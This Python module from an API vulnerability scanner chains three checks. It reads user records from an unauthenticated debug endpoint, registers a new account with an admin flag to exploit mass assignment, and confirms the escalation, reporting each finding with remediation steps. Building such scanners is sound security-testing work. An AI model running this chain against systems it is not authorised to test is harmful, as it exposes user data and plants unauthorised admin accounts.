#!/usr/bin/env python3
"""
Integrated Attack Chain Scanner
Implements a coordinated workflow to detect and verify vulnerabilities in a proper sequence:
1. Check for excessive data exposure via debug endpoints
2. Attempt mass assignment to create admin users
3. Verify privilege escalation by checking admin access

This scanner reduces false positives by validating each step in the attack chain.
"""

import requests
import time
import uuid
from typing import Dict, List, Optional, Any
from urllib.parse import urljoin
from .base_scanner import BaseScanner
from .utils.logger import setup_scanner_logger

class IntegratedAttackChainScanner(BaseScanner):
    def __init__(self):
        super().__init__()
        self.logger = setup_scanner_logger("integrated_attack_chain")
        self.target = None
        self.context = {}
        
    def scan(self, url: str, method: str, path: str, response: requests.Response, token: Optional[str] = None, 
             headers: Optional[Dict[str, str]] = None, tokens: Optional[Dict[str, List[Dict[str, Any]]]] = None, 
             context: Optional[Dict[str, Any]] = None) -> List[Dict[str, Any]]:
        self.base_url = url
        self.target = url
        vulnerabilities = []
        
        # Store context if provided
        if context:
            self.context = context
            self.logger.info(f"Received context with {len(context)} items")
        
        # Generate correlation ID for tracking related requests
        correlation_id = str(uuid.uuid4())
        
        # Set up headers if not provided
        if headers is None:
            headers = {'Authorization': f'Bearer {token}'} if token else {}
            
        # Step 1: Check for excessive data exposure via debug endpoint
        debug_url = urljoin(url, "/users/v1/_debug")
        self.logger.info(f"Testing debug endpoint for excessive data exposure: {debug_url}")
        
        try:
            debug_resp = requests.get(
                debug_url,
                timeout=5,
                allow_redirects=False
            )
            
            if debug_resp.status_code == 200:
                try:
                    debug_data = debug_resp.json()
                    
                    # Check if users data is exposed
                    if "users" in debug_data:
                        users = debug_data.get("users", [])
                        initial_admin_count = len([u for u in users if u.get("admin") == True])
                        
                        # Capture evidence for excessive data exposure
                        debug_req, debug_res = self.capture_transaction(
                            debug_resp,
                            auth_state={"auth_type": "none"},
                            correlation_id=correlation_id
                        )
                        
                        exposed_data = [
                            {
                                "username": user.get("username"),
                                "email": user.get("email"),
                                "admin": user.get("admin"),
                                "has_password": "password" in user
                            } for user in users
                        ]
                        
                        # Add excessive data exposure finding
                        data_exposure_finding = {
                            "type": "EXCESSIVE_DATA_EXPOSURE",
                            "severity": "CRITICAL",
                            "detail": "Debug endpoint exposes sensitive user data including credentials and roles without authentication",
                            "evidence": {
                                "url": debug_url,
                                "method": "GET",
                                "status_code": debug_resp.status_code,
                                "headers": dict(debug_resp.headers),
                                "exposed_data_sample": exposed_data[:2] if exposed_data else [],
                                "total_users_exposed": len(users),
                                "authentication_state": "No credentials provided",
                                "correlation_id": correlation_id
                            },
                            "remediation": {
                                "description": "Debug endpoint exposing sensitive user data without authentication",
                                "impact": "Unauthorized access to user credentials and role information",
                                "steps": [
                                    "Remove or properly secure debug endpoints in production",
                                    "Implement authentication for all sensitive endpoints",
                                    "Limit exposed data to necessary fields only",
                                    "Add proper access controls and role checks",
                                    "Implement request logging and monitoring"
                                ]
                            }
                        }
                        vulnerabilities.append(data_exposure_finding)
                        self.logger.warning(f"Found EXCESSIVE_DATA_EXPOSURE vulnerability at /users/v1/_debug")
                        
                        # Step 2: Attempt privilege escalation through mass assignment
                        self.logger.info("Attempting privilege escalation through mass assignment")
                        
                        # Create unique test user with admin privileges
                        test_payload = {
                            "username": f"test_integrated_{int(time.time())}",
                            "password": "test123",
                            "email": f"test_integrated_{int(time.time())}@example.com",
                            "admin": True  # Attempting to set admin privilege
                        }
                        
                        # Headers setup
                        request_headers = headers.copy()
                        request_headers['Content-Type'] = 'application/json'
                        
                        # Register new user with admin privileges
                        register_url = urljoin(url, "/users/v1/register")
                        register_resp = requests.post(
                            register_url,
                            json=test_payload,
                            headers=request_headers,
                            timeout=5
                        )
                        
                        # Capture evidence for registration attempt
                        register_req, register_res = self.capture_transaction(
                            register_resp,
                            auth_state={"auth_type": "none"},
                            correlation_id=correlation_id
                        )
                        
                        if register_resp.status_code == 200:
                            # Step 3: Verify successful exploitation by checking debug endpoint again
                            self.logger.info("Verifying privilege escalation success")
                            verify_resp = requests.get(debug_url, timeout=5)
                            
                            if verify_resp.status_code == 200:
                                verify_data = verify_resp.json()
                                final_users = verify_data.get("users", [])
                                
                                # Find our newly created user
                                new_admin = next(
                                    (u for u in final_users if u.get("username") == test_payload["username"]), 
                                    None
                                )
                                
                                # Capture evidence for verification
                                verify_req, verify_res = self.capture_transaction(
                                    verify_resp,
                                    auth_state={"auth_type": "none"},
                                    correlation_id=correlation_id
                                )
                                
                                # Only report if we can verify the user was actually created with admin privileges
                                if new_admin and new_admin.get("admin") == True:
                                    # Compare admin count to verify actual privilege escalation
                                    final_admin_count = len([u for u in final_users if u.get("admin") == True])
                                    
                                    if final_admin_count > initial_admin_count:
                                        # Add mass assignment finding with dependency on data exposure
                                        mass_assignment_finding = {
                                            "type": "MASS_ASSIGNMENT_PRIVILEGE_ESCALATION",
                                            "severity": "CRITICAL",
                                            "detail": "Successfully exploited mass assignment to create admin user",
                                            "evidence": {
                                                "initial_state": {
                                                    "request": debug_req,
                                                    "response": debug_res,
                                                    "admin_count": initial_admin_count
                                                },
                                                "exploitation": {
                                                    "request": register_req,
                                                    "response": register_res,
                                                    "payload": test_payload
                                                },
                                                "verification": {
                                                    "request": verify_req,
                                                    "response": verify_res,
                                                    "new_admin_user": new_admin,
                                                    "final_admin_count": final_admin_count
                                                },
                                                "correlation_id": correlation_id
                                            },
                                            "dependencies": ["EXCESSIVE_DATA_EXPOSURE"],
                                            "remediation": {
                                                "description": "Mass assignment vulnerability allows privilege escalation",
                                                "impact": "Unauthorized users can gain administrative access",
                                                "steps": [
                                                    "Implement proper input validation",
                                                    "Use allowlists for permitted fields",
                                                    "Add role-based access control",
                                                    "Implement proper authorization checks",
                                                    "Add server-side validation for sensitive fields"
                                                ]
                                            }
                                        }
                                        vulnerabilities.append(mass_assignment_finding)
                                        self.logger.warning("Found MASS_ASSIGNMENT_PRIVILEGE_ESCALATION vulnerability")
                                        
                                        # Step 4: Add NO_CREDENTIALS_REQUIRED finding to complete the chain
                                        no_creds_finding = {
                                            "type": "NO_CREDENTIALS_REQUIRED",
                                            "severity": "HIGH",
                                            "detail": "Sensitive operations can be performed without authentication",
                                            "evidence": {
                                                "debug_access": {
                                                    "url": debug_url,
                                                    "status_code": debug_resp.status_code
                                                },
                                                "user_registration": {
                                                    "url": register_url,
                                                    "status_code": register_resp.status_code
                                                },
                                                "correlation_id": correlation_id
                                            },
                                            "dependencies": ["EXCESSIVE_DATA_EXPOSURE", "MASS_ASSIGNMENT_PRIVILEGE_ESCALATION"],
                                            "remediation": {
                                                "description": "Critical operations can be performed without authentication",
                                                "impact": "Complete system compromise",
                                                "steps": [
                                                    "Implement proper authentication for all endpoints",
                                                    "Add authorization checks based on user roles",
                                                    "Implement proper session management",
                                                    "Add rate limiting to prevent abuse"
                                                ]
                                            }
                                        }
                                        vulnerabilities.append(no_creds_finding)
                                        self.logger.warning("Found NO_CREDENTIALS_REQUIRED vulnerability")
                except ValueError as e:
                    self.logger.error(f"Error parsing debug endpoint response: {str(e)}")
        except requests.RequestException as e:
            self.logger.error(f"Error accessing debug endpoint: {str(e)}")
            
        return vulnerabilities

# Keep the scan function for backward compatibility
scan = IntegratedAttackChainScanner().scan